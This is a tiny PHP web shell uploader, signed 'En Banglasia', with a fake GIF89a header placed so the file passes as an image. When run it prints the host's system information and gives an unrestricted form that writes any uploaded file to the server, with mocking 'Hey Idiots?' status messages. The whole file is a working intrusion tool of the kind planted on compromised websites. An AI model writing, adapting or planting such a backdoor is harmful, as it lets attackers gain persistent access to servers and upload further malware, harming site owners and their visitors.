GIF89a <title>Fuckedz By En Banglasia</title>
<?php
echo "Priv8 Uploaders By En Banglasia";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='Fuckedz'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['Fuckedz']['tmp_name'], $_FILES['Fuckedz']['name'])) {
	echo "Hey Idiots? Successfully!";
	} else {
	echo "Hey Idiots? Failed!";
	}
}
?>
